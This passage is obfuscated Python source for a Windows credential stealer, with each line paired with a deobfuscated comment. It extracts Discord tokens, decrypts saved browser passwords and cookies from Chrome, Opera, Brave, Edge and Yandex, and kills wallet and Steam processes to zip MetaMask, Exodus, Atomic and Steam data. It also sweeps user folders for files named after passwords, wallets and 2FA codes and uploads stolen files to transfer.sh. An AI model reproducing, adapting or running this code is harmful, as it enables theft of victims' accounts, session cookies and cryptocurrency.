	O0O000000O0O0O000 =A .getenv (AF )+f"\\wp{O0OO00000O00O0OOO}.txt"#line:186:E=A.getenv(AF)+f"\\wp{name}.txt"
	with J (O0O000000O0O0O000 ,mode ='w',encoding =y )as O000O000O00OOOOOO :#line:187:with J(E,mode='w',encoding=y)as C:
		O000O000O00OOOOOO .write (f"""
***********************************************
*    _____                       _      _     *
*   / _  /   ___    ___    ___  | | __ | |_   *
*   \\// /   / _ \\  / _ \\  / __| | |/ / | __|  *
*    / //\\ |  __/ |  __/ | (__  |   <  | |_   *
*   /____/  \\___|  \\___|  \\___| |_|\\_\\  \\__|  *
*                                             *
***********************************************

""")#line:198:""")
		for OOOOO00O0O000O0OO in O0000O00OOO0O0O00 :#line:199:for D in data:
			if OOOOO00O0O000O0OO [0 ]!=B :O000O000O00OOOOOO .write (f"{OOOOO00O0O000O0OO}\n")#line:200:if D[0]!=B:C.write(f"{D}\n")
R =B #line:201:R=B
def Af (O000OOO0OOO0O0OOO ,O0O00O00OO0000000 ):#line:202:def Af(path,arg):
	O0OOO0OO00O00O000 =O000OOO0OOO0O0OOO #line:203:B=path
	if not A .path .exists (O0OOO0OO00O00O000 ):return #line:204:if not A.path.exists(B):return
	O0OOO0OO00O00O000 +=O0O00O00OO0000000 #line:205:B+=arg
	for OO00O000OO0O0OOOO in A .listdir (O0OOO0OO00O00O000 ):#line:206:for D in A.listdir(B):
		if OO00O000OO0O0OOOO .endswith (B1 )or OO00O000OO0O0OOOO .endswith (B2 ):#line:207:if D.endswith(B1)or D.endswith(B2):
			for OOO00000O0OOO0O00 in [O00OOOO0OO0OOO0O0 .strip ()for O00OOOO0OO0OOO0O0 in J (f"{O0OOO0OO00O00O000}\\{OO00O000OO0O0OOOO}",errors =AG ).readlines ()if O00OOOO0OO0OOO0O0 .strip ()]:#line:208:for E in [A.strip()for A in J(f"{B}\\{D}",errors=AG).readlines()if A.strip()]:
				for O00OOO0OO00O000OO in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):#line:209:for F in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
					for OOOO0O0O0O0O0O0OO in re .findall (O00OOO0OO00O000OO ,OOO00000O0OOO0O00 ):#line:210:for C in re.findall(F,E):
						global R #line:211:global R
						if A8 (OOOO0O0O0O0O0O0OO ):#line:212:if A8(C):
							if not OOOO0O0O0O0O0O0OO in R :R +=OOOO0O0O0O0O0O0OO ;A9 (OOOO0O0O0O0O0O0OO ,O0OOO0OO00O00O000 )#line:213:if not C in R:R+=C;A9(C,B)
p =[]#line:214:p=[]
def Ag (O00O00O000O0OO00O ,OO0O00O00O00OOOOO ):#line:215:def Ag(path,arg):
	O000O00OOO000O0OO =O00O00O000O0OO00O ;global p #line:216:E=path;global p
	if not A .path .exists (O000O00OOO000O0OO ):return #line:217:if not A.path.exists(E):return
	O0O00OO000O0000O0 =O000O00OOO000O0OO +OO0O00O00O00OOOOO +'/Login Data'#line:218:I=E+arg+'/Login Data'
	if A .stat (O0O00OO000O0000O0 ).st_size ==0 :return #line:219:if A.stat(I).st_size==0:return
	O0OOO0OO00O0OOOOO =k +'wp'+B .join ((A3 .choice (B3 )for OO0OOO0OOO0O00OO0 in u (8 )))+B4 ;A2 .copy2 (O0O00OO000O0000O0 ,O0OOO0OO00O0OOOOO );OO0000O0OOO00OO00 =z (O0OOO0OO00O0OOOOO );O0OOOOO00OO00000O =OO0000O0OOO00OO00 .cursor ();O0OOOOO00OO00000O .execute ('SELECT action_url, username_value, password_value FROM logins;');OOO0O000OO0O0O0OO =O0OOOOO00OO00000O .fetchall ();O0OOOOO00OO00000O .close ();OO0000O0OOO00OO00 .close ();A .remove (O0OOO0OO00O0OOOOO );O00O00OO00O000O00 =O000O00OOO000O0OO +AP #line:220:F=k+'wp'+B.join((A3.choice(B3)for A in u(8)))+B4;A2.copy2(I,F);K=z(F);G=K.cursor();G.execute('SELECT action_url, username_value, password_value FROM logins;');M=G.fetchall();G.close();K.close();A.remove(F);N=E+AP
	with J (O00O00OO00O000O00 ,'r',encoding =y )as O0OOO0000O0OO0O0O :OO00OOO0O0000O00O =g (O0OOO0000O0OO0O0O .read ())#line:221:with J(N,'r',encoding=y)as O:P=g(O.read())
	OOOO00OO00O0O000O =a (OO00OOO0O0000O00O [AQ ][AR ]);OOOO00OO00O0O000O =m (OOOO00OO00O0O000O [5 :])#line:222:H=a(P[AQ][AR]);H=m(H[5:])
	for OOOOO000OOOOOO000 in OOO0O000OO0O0O0OO :#line:223:for C in M:
		if OOOOO000OOOOOO000 [0 ]!=B :#line:224:if C[0]!=B:
			for O0O0O000000O0O000 in q :#line:225:for D in q:
				O0OOO0OO0OOOO0OOO =O0O0O000000O0O000 #line:226:L=D
				if x in O0O0O000000O0O000 :O000O000OO0O00OO0 =O0O0O000000O0O000 ;O0O0O000000O0O000 =O000O000OO0O00OO0 .split ('[')[1 ].split (']')[0 ]#line:227:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if O0O0O000000O0O000 in OOOOO000OOOOOO000 [0 ]:#line:228:if D in C[0]:
					if not O0OOO0OO0OOOO0OOO in s :s .append (O0OOO0OO0OOOO0OOO )#line:229:if not L in s:s.append(L)
			p .append (f"""
========================
URL: {OOOOO000OOOOOO000[0]}
Username: {OOOOO000OOOOOO000[1]}
Password: {n(OOOOO000OOOOOO000[2],OOOO00OO00O0O000O)}
========================
""")#line:236:""")
	AA (p ,AS )#line:237:AA(p,AS)
V =[]#line:238:V=[]
def Ah (OO000OO00O0OO00O0 ,OOO0OOOOOOO000OOO ):#line:239:def Ah(path,arg):
	OO0OO000O00OO00O0 =OO000OO00O0OO00O0 ;global V #line:240:E=path;global V
	if not A .path .exists (OO0OO000O00OO00O0 ):return #line:241:if not A.path.exists(E):return
	O0OOOOO00O0OO0O00 =OO0OO000O00OO00O0 +OOO0OOOOOOO000OOO +'/Cookies'#line:242:I=E+arg+'/Cookies'
	if A .stat (O0OOOOO00O0OO0O00 ).st_size ==0 :return #line:243:if A.stat(I).st_size==0:return
	O00O0OO0O0OOOO000 =k +'wp'+B .join ((A3 .choice (B3 )for OOO00OO000OO00O0O in u (8 )))+B4 ;A2 .copy2 (O0OOOOO00O0OO0O00 ,O00O0OO0O0OOOO000 );OOOO0OO0OO0OO0OOO =z (O00O0OO0O0OOOO000 );OO000O0O0OO0OOO00 =OOOO0OO0OO0OO0OOO .cursor ();OO000O0O0OO0OOO00 .execute ('SELECT host_key, name, encrypted_value FROM cookies');O000OO0OOOO0OOOOO =OO000O0O0OO0OOO00 .fetchall ();OO000O0O0OO0OOO00 .close ();OOOO0OO0OO0OO0OOO .close ();A .remove (O00O0OO0O0OOOO000 );O0O0OOOOOOO0OOOO0 =OO0OO000O00OO00O0 +AP #line:244:F=k+'wp'+B.join((A3.choice(B3)for A in u(8)))+B4;A2.copy2(I,F);K=z(F);G=K.cursor();G.execute('SELECT host_key, name, encrypted_value FROM cookies');M=G.fetchall();G.close();K.close();A.remove(F);N=E+AP
	with J (O0O0OOOOOOO0OOOO0 ,'r',encoding =y )as OOOO000O0O0OOOO00 :OO0OO0O0OOOOOOOOO =g (OOOO000O0O0OOOO00 .read ())#line:245:with J(N,'r',encoding=y)as O:P=g(O.read())
	OO0OO00000OOOO000 =a (OO0OO0O0OOOOOOOOO [AQ ][AR ]);OO0OO00000OOOO000 =m (OO0OO00000OOOO000 [5 :])#line:246:H=a(P[AQ][AR]);H=m(H[5:])
	for O000OO00O0000O000 in O000OO0OOOO0OOOOO :#line:247:for C in M:
		if O000OO00O0000O000 [0 ]!=B :#line:248:if C[0]!=B:
			for O00O000OO0OO0OO0O in q :#line:249:for D in q:
				OOOO00O00OOO00OO0 =O00O000OO0OO0OO0O #line:250:L=D
				if x in O00O000OO0OO0OO0O :O0OO0O0O0OOOO0O0O =O00O000OO0OO0OO0O ;O00O000OO0OO0OO0O =O0OO0O0O0OOOO0O0O .split ('[')[1 ].split (']')[0 ]#line:251:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if O00O000OO0OO0OO0O in O000OO00O0000O000 [0 ]:#line:252:if D in C[0]:
					if not OOOO00O00OOO00OO0 in r :r .append (OOOO00O00OOO00OO0 )#line:253:if not L in r:r.append(L)
			V .append (f"{O000OO00O0000O000[0]}\tTRUE\t/\tFALSE\t2597573456\t{O000OO00O0000O000[1]}\t{n(O000OO00O0000O000[2],OO0OO00000OOOO000)}")#line:254:V.append(f"{C[0]}\tTRUE\t/\tFALSE\t2597573456\t{C[1]}\t{n(C[2],H)}")
	AA (V ,'cook')#line:255:AA(V,'cook')
def Ai (OO000000OOO0000O0 ,O000O00OOOOOOOOO0 ):#line:256:def Ai(path,arg):
	O0OO0000OOO00O0OO =OO000000OOO0000O0 #line:257:B=path
	if not A .path .exists (f"{O0OO0000OOO00O0OO}/Local State"):return #line:258:if not A.path.exists(f"{B}/Local State"):return
	OO0O0O0O0OOOOO000 =O0OO0000OOO00O0OO +O000O00OOOOOOOOO0 ;O00OOO0O0OO0OO000 =O0OO0000OOO00O0OO +AP #line:259:F=B+arg;G=B+AP
	with J (O00OOO0O0OO0OO000 ,'r',encoding =y )as OOO0O00O0O000OO00 :OOO0O0OO0OO0O0O00 =g (OOO0O00O0O000OO00 .read ())#line:260:with J(G,'r',encoding=y)as H:I=g(H.read())
	OOOOO0O00000O0O00 =a (OOO0O0OO0OO0O0O00 [AQ ][AR ]);OOOOO0O00000O0O00 =m (OOOOO0O00000O0O00 [5 :])#line:261:D=a(I[AQ][AR]);D=m(D[5:])
	for O0OO0OOOO0OOOO00O in A .listdir (OO0O0O0O0OOOOO000 ):#line:262:for E in A.listdir(F):
		if O0OO0OOOO0OOOO00O .endswith (B1 )or O0OO0OOOO0OOOO00O .endswith (B2 ):#line:263:if E.endswith(B1)or E.endswith(B2):
			for OO0OOO00OOOOOOOOO in [O0O000OOO00O00O0O .strip ()for O0O000OOO00O00O0O in J (f"{OO0O0O0O0OOOOO000}\\{O0OO0OOOO0OOOO00O}",errors =AG ).readlines ()if O0O000OOO00O00O0O .strip ()]:#line:264:for K in [A.strip()for A in J(f"{F}\\{E}",errors=AG).readlines()if A.strip()]:
				for O0OOOOO00OO00O00O in re .findall ('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',OO0OOO00OOOOOOOOO ):#line:265:for L in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',K):
					global R ;OO0OO000000OO000O =n (a (O0OOOOO00OO00O00O .split ('dQw4w9WgXcQ:')[1 ]),OOOOO0O00000O0O00 )#line:266:global R;C=n(a(L.split('dQw4w9WgXcQ:')[1]),D)
					if A8 (OO0OO000000OO000O ):#line:267:if A8(C):
						if not OO0OO000000OO000O in R :R +=OO0OO000000OO000O ;A9 (OO0OO000000OO000O ,O0OO0000OOO00O0OO )#line:268:if not C in R:R+=C;A9(C,B)
def AB (OOOO0OO000OO0OOOO ,OO00O0O00O0O0OO00 ,OO0OO000O00000O00 ):#line:269:def AB(path,arg,procc):
	OOO0O0000000000OO =' ';OO0OO00OO0OO00O00 =OOOO0OO000OO0OOOO ;O0OO00O0OO00O0OOO =OO00O0O00O0O0OO00 ;OO00OO00O00OOOOOO =OO0OO00OO0OO00O00 ;O0O0000O0OOO0OOO0 =O0OO00O0OO00O0OOO #line:270:R=' ';H=path;E=arg;D=H;G=E
	if 'nkbihfbeogaeaoehlefnkodbefgpgknn'in O0OO00O0OO00O0OOO :OO00000000OO0OOO0 =OO0OO00OO0OO00O00 .split (AT )[4 ].split (C )[1 ].replace (OOO0O0000000000OO ,B );O0O0000O0OOO0OOO0 =f"Metamask_{OO00000000OO0OOO0}_{A.getlogin()}";OO00OO00O00OOOOOO =OO0OO00OO0OO00O00 +O0OO00O0OO00O0OOO #line:271:if'nkbihfbeogaeaoehlefnkodbefgpgknn'in E:I=H.split(AT)[4].split(C)[1].replace(R,B);G=f"Metamask_{I}_{A.getlogin()}";D=H+E
	if not A .path .exists (OO00OO00O00OOOOOO ):return #line:272:if not A.path.exists(D):return
	A4 .Popen (f"taskkill /im {OO0OO000O00000O00} /t /f",shell =F )#line:273:A4.Popen(f"taskkill /im {procc} /t /f",shell=F)
	if AU in O0OO00O0OO00O0OOO or B5 in O0OO00O0OO00O0OOO :OO00000000OO0OOO0 =OO0OO00OO0OO00O00 .split (AT )[4 ].split (C )[1 ].replace (OOO0O0000000000OO ,B );O0O0000O0OOO0OOO0 =f"{OO00000000OO0OOO0}_{A.getlogin()}"#line:274:if AU in E or B5 in E:I=H.split(AT)[4].split(C)[1].replace(R,B);G=f"{I}_{A.getlogin()}"
	elif B6 in O0OO00O0OO00O0OOO :#line:275:elif B6 in E:
		if not A .path .isfile (f"{OO00OO00O00OOOOOO}/loginusers.vdf"):return #line:276:if not A.path.isfile(f"{D}/loginusers.vdf"):return
		OOO0OOO000OOOOO0O =J (f"{OO00OO00O00OOOOOO}/loginusers.vdf",'r+',encoding =Av );O00000O0O000OOO00 =OOO0OOO000OOOOO0O .readlines ();O0O0OOO000O0OOO0O =Q #line:277:N=J(f"{D}/loginusers.vdf",'r+',encoding=Av);O=N.readlines();K=Q
		for O0OOOOOOO0000OO0O in O00000O0O000OOO00 :#line:278:for P in O:
			if 'RememberPassword"\t\t"1"'in O0OOOOOOO0000OO0O :O0O0OOO000O0OOO0O =F #line:279:if'RememberPassword"\t\t"1"'in P:K=F
		if O0O0OOO000O0OOO0O ==Q :return #line:280:if K==Q:return
		O0O0000O0OOO0OOO0 =O0OO00O0OO00O0OOO #line:281:G=E
	OO00O0OOO0OO0O00O =ZipFile (f"{OO00OO00O00OOOOOO}/{O0O0000O0OOO0OOO0}.zip",'w')#line:282:L=ZipFile(f"{D}/{G}.zip",'w')
	for O00O00O0OOOO0O00O in A .listdir (OO00OO00O00OOOOOO ):#line:283:for M in A.listdir(D):
		if not '.zip'in O00O00O0OOOO0O00O :OO00O0OOO0OO0O00O .write (OO00OO00O00OOOOOO +C +O00O00O0OOOO0O00O )#line:284:if not'.zip'in M:L.write(D+C+M)
	OO00O0OOO0OO0O00O .close ();o (f"{OO00OO00O00OOOOOO}/{O0O0000O0OOO0OOO0}.zip");A .remove (f"{OO00OO00O00OOOOOO}/{O0O0000O0OOO0OOO0}.zip")#line:285:L.close();o(f"{D}/{G}.zip");A.remove(f"{D}/{G}.zip")
def Aj ():#line:286:def Aj():
	OOOO00000OO0OOOO0 ='chrome.exe';OO0O000O0O0O0000O ='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';OOO0OO0O000000OOO ='/Network';O00OO0000OO000OO0 ='opera.exe';O0000O0OO00O0O00O ='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';OOO0OOOOOOO0OO000 ='/Default/Network';OOO000000O00O0000 ='/Default';OOO0O0O0OOOOOO00O ='/Default/Local Storage/leveldb';OO0O00O0O0O00000O ='/Local Storage/leveldb';O0OOO0OO0OO0OOO00 =[[f"{E}/Opera Software/Opera GX Stable",O00OO0000OO000OO0 ,OO0O00O0O0O00000O ,C ,OOO0OO0O000000OOO ,OO0O000O0O0O0000O ],[f"{E}/Opera Software/Opera Stable",O00OO0000OO000OO0 ,OO0O00O0O0O00000O ,C ,OOO0OO0O000000OOO ,OO0O000O0O0O0000O ],[f"{E}/Opera Software/Opera Neon/User Data/Default",O00OO0000OO000OO0 ,OO0O00O0O0O00000O ,C ,OOO0OO0O000000OOO ,OO0O000O0O0O0000O ],[f"{U}/Google/Chrome/User Data",OOOO00000OO0OOOO0 ,OOO0O0O0OOOOOO00O ,OOO000000O00O0000 ,OOO0OOOOOOO0OO000 ,O0000O0OO00O0O00O ],[f"{U}/Google/Chrome SxS/User Data",OOOO00000OO0OOOO0 ,OOO0O0O0OOOOOO00O ,OOO000000O00O0000 ,OOO0OOOOOOO0OO000 ,O0000O0OO00O0O00O ],[f"{U}/BraveSoftware/Brave-Browser/User Data",'brave.exe',OOO0O0O0OOOOOO00O ,OOO000000O00O0000 ,OOO0OOOOOOO0OO000 ,O0000O0OO00O0O00O ],[f"{U}/Yandex/YandexBrowser/User Data",'yandex.exe',OOO0O0O0OOOOOO00O ,OOO000000O00O0000 ,OOO0OOOOOOO0OO000 ,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{U}/Microsoft/Edge/User Data",'edge.exe',OOO0O0O0OOOOOO00O ,OOO000000O00O0000 ,OOO0OOOOOOO0OO000 ,O0000O0OO00O0O00O ]];OOOO00O00O0OO00O0 =[[f"{E}/Discord",OO0O00O0O0O00000O ],[f"{E}/Lightcord",OO0O00O0O0O00000O ],[f"{E}/discordcanary",OO0O00O0O0O00000O ],[f"{E}/discordptb",OO0O00O0O0O00000O ]];O00000O0O0O0OO00O =[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AU ],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AU ],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B6 ],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B5 ]]#line:287:Y='chrome.exe';R='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';Q='/Network';P='opera.exe';N='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';K='/Default/Network';J='/Default';I='/Default/Local Storage/leveldb';G='/Local Storage/leveldb';H=[[f"{E}/Opera Software/Opera GX Stable",P,G,C,Q,R],[f"{E}/Opera Software/Opera Stable",P,G,C,Q,R],[f"{E}/Opera Software/Opera Neon/User Data/Default",P,G,C,Q,R],[f"{U}/Google/Chrome/User Data",Y,I,J,K,N],[f"{U}/Google/Chrome SxS/User Data",Y,I,J,K,N],[f"{U}/BraveSoftware/Brave-Browser/User Data",'brave.exe',I,J,K,N],[f"{U}/Yandex/YandexBrowser/User Data",'yandex.exe',I,J,K,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{U}/Microsoft/Edge/User Data",'edge.exe',I,J,K,N]];S=[[f"{E}/Discord",G],[f"{E}/Lightcord",G],[f"{E}/discordcanary",G],[f"{E}/discordptb",G]];T=[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AU],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AU],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B6],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B5]]
	for OO00O00OO00O00000 in O0OOO0OO0OO0OOO00 :OO00OO0OO000OO00O =M .Thread (target =Af ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [2 ]]);OO00OO0OO000OO00O .start ();b .append (OO00OO0OO000OO00O )#line:288:for B in H:D=M.Thread(target=Af,args=[B[0],B[2]]);D.start();b.append(D)
	for OO00O00OO00O00000 in OOOO00O00O0OO00O0 :OO00OO0OO000OO00O =M .Thread (target =Ai ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [1 ]]);OO00OO0OO000OO00O .start ();b .append (OO00OO0OO000OO00O )#line:289:for B in S:D=M.Thread(target=Ai,args=[B[0],B[1]]);D.start();b.append(D)
	for OO00O00OO00O00000 in O0OOO0OO0OO0OOO00 :OO00OO0OO000OO00O =M .Thread (target =Ag ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [3 ]]);OO00OO0OO000OO00O .start ();b .append (OO00OO0OO000OO00O )#line:290:for B in H:D=M.Thread(target=Ag,args=[B[0],B[3]]);D.start();b.append(D)
	O0O00OOOO0OOO0O00 =[]#line:291:O=[]
	for OO00O00OO00O00000 in O0OOO0OO0OO0OOO00 :OO00OO0OO000OO00O =M .Thread (target =Ah ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [4 ]]);OO00OO0OO000OO00O .start ();O0O00OOOO0OOO0O00 .append (OO00OO0OO000OO00O )#line:292:for B in H:D=M.Thread(target=Ah,args=[B[0],B[4]]);D.start();O.append(D)
	for O0O0O000OO0OOOO00 in O0O00OOOO0OOO0O00 :O0O0O000OO0OOOO00 .join ()#line:293:for L in O:L.join()
	OO0000OO0OOOO0OOO =A7 (V )#line:294:W=A7(V)
	if OO0000OO0OOOO0OOO ==F :return #line:295:if W==F:return
	for OO00O00OO00O00000 in O0OOO0OO0OO0OOO00 :M .Thread (target =AB ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [5 ],OO00O00OO00O00000 [1 ]]).start ()#line:296:for B in H:M.Thread(target=AB,args=[B[0],B[5],B[1]]).start()
	for OO00O00OO00O00000 in O00000O0O0O0OO00O :M .Thread (target =AB ,args =[OO00O00OO00O00000 [0 ],OO00O00OO00O00000 [2 ],OO00O00OO00O00000 [1 ]]).start ()#line:297:for B in T:M.Thread(target=AB,args=[B[0],B[2],B[1]]).start()
	for O0O0O000OO0OOOO00 in b :O0O0O000OO0OOOO00 .join ()#line:298:for L in b:L.join()
	global Ak ;Ak =[]#line:299:global Ak;Ak=[]
	for OOO0O0O0O0O0000OO in ['wppassw.txt','wpcook.txt']:o (A .getenv (AF )+AT +OOO0O0O0O0O0000OO )#line:300:for X in ['wppassw.txt','wpcook.txt']:o(A.getenv(AF)+AT+X)
def AC (OO00O00000O000O0O ):#line:301:def AC(path):
	try :OO000OOO00O0O0000 ={B0 :(OO00O00000O000O0O ,J (OO00O00000O000O0O ,mode ='rb'))};...;O0000OOOO00000O0O =O .post ('https://transfer.sh/',files =OO000OOO00O0O0000 );OOO000O0O0OO0OO00 =O0000OOOO00000O0O .text ;return OOO000O0O0OO0OO00 #line:302:try:A={B0:(path,J(path,mode='rb'))};...;B=O.post('https://transfer.sh/',files=A);C=B.text;return C
	except :return Q #line:303:except:return Q
def Al (O00OOO00O00O0O0O0 ,O0OOOO000O0OOOOOO ):#line:304:def Al(pathF,keywords):
	O0OO00O0O00OOO0O0 =O00OOO00O00O0O0O0 ;global W ;OOO0O0O000O000000 =7 ;O0OOOO000O00O0000 =0 ;O00O000OO0O0OOO00 =A .listdir (O0OO00O0O00OOO0O0 );OO000O0OOOO0000OO =[]#line:305:B=pathF;global W;G=7;E=0;H=A.listdir(B);F=[]
	for OOOO0O0O0O000OO00 in O00O000OO0O0OOO00 :#line:306:for D in H:
		if not A .path .isfile (O0OO00O0O00OOO0O0 +C +OOOO0O0O0O000OO00 ):return #line:307:if not A.path.isfile(B+C+D):return
		O0OOOO000O00O0000 +=1 #line:308:E+=1
		if O0OOOO000O00O0000 <=OOO0O0O000O000000 :O00O0O0000O0OO000 =AC (O0OO00O0O00OOO0O0 +C +OOOO0O0O0O000OO00 );OO000O0OOOO0000OO .append ([O0OO00O0O00OOO0O0 +C +OOOO0O0O0O000OO00 ,O00O0O0000O0OO000 ])#line:309:if E<=G:I=AC(B+C+D);F.append([B+C+D,I])
		else :break #line:310:else:break
	W .append ([B7 ,O0OO00O0O00OOO0O0 +C ,OO000O0OOOO0000OO ])#line:311:W.append([B7,B+C,F])
W =[]#line:312:W=[]
def Am (OOOOOO0O00000O00O ,OO00OOO00O0000000 ):#line:313:def Am(path,keywords):
	O000OOO000OO00O0O =OO00OOO00O0000000 ;OO000000OO0000OO0 =OOOOOO0O00000O00O ;global W ;O0000000O0O00OO0O =[];OO0OOOOOOOO00O0OO =A .listdir (OO000000OO0000OO0 )#line:314:E=keywords;B=path;global W;F=[];G=A.listdir(B)
	for OOOO000O0O00000O0 in OO0OOOOOOOO00O0OO :#line:315:for D in G:
		for OO000O00000O0OOO0 in O000OOO000OO00O0O :#line:316:for H in E:
			if OO000O00000O0OOO0 in OOOO000O0O00000O0 .lower ():#line:317:if H in D.lower():
				if A .path .isfile (OO000000OO0000OO0 +C +OOOO000O0O00000O0 )and '.txt'in OOOO000O0O00000O0 :O0000000O0O00OO0O .append ([OO000000OO0000OO0 +C +OOOO000O0O00000O0 ,AC (OO000000OO0000OO0 +C +OOOO000O0O00000O0 )]);break #line:318:if A.path.isfile(B+C+D)and'.txt'in D:F.append([B+C+D,AC(B+C+D)]);break
				if A .path .isdir (OO000000OO0000OO0 +C +OOOO000O0O00000O0 ):O00OOOO0O0O0O00O0 =OO000000OO0000OO0 +C +OOOO000O0O00000O0 ;Al (O00OOOO0O0O0O00O0 ,O000OOO000OO00O0O );break #line:319:if A.path.isdir(B+C+D):I=B+C+D;Al(I,E);break
	W .append ([B7 ,OO000000OO0000OO0 ,O0000000O0O00OO0O ])#line:320:W.append([B7,B,F])
def An ():#line:321:def An():
	O00O000O0OOO0O0O0 ='secret';OOO00O0O00OO0O0O0 ='acount';O0O0OOOO00O0O000O ='account';OO00000OOO0000O0O =k .split ('\\AppData')[0 ];O0000O0OO0O0OOOO0 =[OO00000OOO0000O0O +'/Desktop',OO00000OOO0000O0O +'/Downloads',OO00000OOO0000O0O +'/Documents'];OO000OOO0OOOOOOO0 =[O0O0OOOO00O0O000O ,OOO00O0O00OO0O0O0 ,AS ,O00O000O0OOO0O0O0 ];O0000O00OOOO000O0 =[AS ,'mdp','motdepasse','mot_de_passe','login',B8 ,O00O000O0OOO0O0O0 ,O0O0OOOO00O0O000O ,OOO00O0O00OO0O0O0 ,'paypal','banque',O0O0OOOO00O0O000O ,'metamask','wallet',B9 ,'exodus','discord','2fa','code','memo','compte',Ay ,'backup','tokens','seecret'];O00O0OOO0O0OO0000 =[]#line:322:I='secret';H='acount';D='account';A=k.split('\\AppData')[0];E=[A+'/Desktop',A+'/Downloads',A+'/Documents'];J=[D,H,AS,I];F=[AS,'mdp','motdepasse','mot_de_passe','login',B8,I,D,H,'paypal','banque',D,'metamask','wallet',B9,'exodus','discord','2fa','code','memo','compte',Ay,'backup','tokens','seecret'];B=[]
	for OO000O0O0O000OO0O in O0000O0OO0O0OOOO0 :OO0O0OO0OOO000000 =M .Thread (target =Am ,args =[OO000O0O0O000OO0O ,O0000O00OOOO000O0 ]);OO0O0OO0OOO000000 .start ();O00O0OOO0O0OO0000 .append (OO0O0OO0OOO000000 )#line:323:for G in E:C=M.Thread(target=Am,args=[G,F]);C.start();B.append(C)
	return O00O0OOO0O0OO0000 #line:324:return B
global q ,r ,s #line:325:global q,r,s
q =['mail','nft',B8 ,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',B9 ,'[uber](https://uber.com)','[netflix](https://netflix.com)']#line:326:q=['mail','nft',B8,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',B9,'[uber](https://uber.com)','[netflix](https://netflix.com)']
r =[]#line:327:r=[]
s =[]#line:328:s=[]
Aj ()#line:329:Aj()
N =A7 (V )#line:330:N=A7(V)
if not N :#line:331:if not N:
	Ao =An ()#line:332:Ao=An()
	for Ap in Ao :Ap .join ()#line:333:for Ap in Ao:Ap.join()
	time .sleep (0.2 );c ='\n'#line:334:time.sleep(0.2);c='\n'
	for t in W :#line:335:for t in W:
		if P (t [2 ])!=0 :#line:336:if P(t[2])!=0:
			Aq =t [1 ];Ar =t [2 ];c +=f"• {Aq}\n"#line:337:Aq=t[1];Ar=t[2];c+=f"• {Aq}\n"
			for AD in Ar :AE =AD [0 ].split (C );As =AE [P (AE )-1 ];At =AD [1 ];c +=f"... [{As}]({At})\n"#line:338:for AD in Ar:AE=AD[0].split(C);As=AE[P(AE)-1];At=AD[1];c+=f"... [{As}]({At})\n"
			c +='\n'#line:339:c+='\n'
	o (A_ ,c )
